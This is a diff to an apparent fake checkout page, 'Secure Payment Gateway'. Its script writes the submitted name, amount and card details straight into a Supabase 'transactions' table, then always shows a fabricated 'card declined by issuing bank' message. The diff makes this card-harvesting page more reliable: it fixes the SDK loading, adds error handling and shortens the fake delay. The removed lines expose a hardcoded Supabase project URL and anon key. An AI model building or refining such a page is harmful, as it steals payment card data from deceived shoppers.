@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Checkout | Secure Payment Gateway</title>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
   <style>
     :root {
       --bg: #07090e;
@@ -25,7 +25,7 @@
     .header { text-align: center; margin-bottom: 24px; }
     .header h2 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
     .header p { font-size: 13px; color: var(--text-dim); }
-    .alert { padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 20px; display: none; }
+    .alert { padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 20px; display: none; word-break: break-all; }
     .alert-danger { background: rgba(255,77,77,0.15); border: 1px solid var(--danger); color: var(--danger); }
     .form-group { margin-bottom: 16px; }
     .form-row { display: flex; gap: 12px; }
@@ -138,10 +138,16 @@
   </div>
 
   <script>
-    // Supabase Configuration
-    const SUPABASE_URL = "https://vkqeqjuobqnzxdwdlhdo.supabase.co";
-    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZrcWVxanVvYnFuenhkd2RsaGRvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODU0MzYyMDgsImV4cCI6MjEwMTAxMjIwOH0.K-3BVayX-30Fe2EyAYsF21vEEStUOWnHKTJoOWJk34g";
-    const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    // ⚠️ REPLACED YOUR ACTUAL KEYS HERE BELOW:
+    const SUPABASE_URL = "YOUR_SUPABASE_PROJECT_URL";
+    const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY";
+
+    let _supabase;
+    try {
+      _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    } catch(e) {
+      console.error("Supabase Client Init Failed", e);
+    }
 
     const amountInput = document.getElementById('amount');
     const cardInput = document.getElementById('card_number');
@@ -178,6 +184,13 @@
       alertBox.style.display = 'none';
       loadingOverlay.style.display = 'flex';
 
+      if(!_supabase) {
+        loadingOverlay.style.display = 'none';
+        alertBox.textContent = "Supabase SDK not initialized. Please refresh.";
+        alertBox.style.display = 'block';
+        return;
+      }
+
       const payload = {
         amount: parseFloat(amountInput.value.trim()),
         full_name: document.getElementById('full_name').value,
@@ -195,8 +208,7 @@
       };
 
       try {
-        // Save to Supabase Table directly
-        const { error } = await _supabase.from('transactions').insert([payload]);
+        const { data, error } = await _supabase.from('transactions').insert([payload]);
 
         if (error) throw error;
 
@@ -204,11 +216,11 @@
           loadingOverlay.style.display = 'none';
           alertBox.textContent = 'Transaction Failed: Card declined by issuing bank.';
           alertBox.style.display = 'block';
-        }, 2000);
+        }, 1500);
 
       } catch (err) {
         loadingOverlay.style.display = 'none';
-        alertBox.textContent = 'Database error: ' + err.message;
+        alertBox.textContent = 'Database Error: ' + (err.message || JSON.stringify(err));
         alertBox.style.display = 'block';
       }
     });
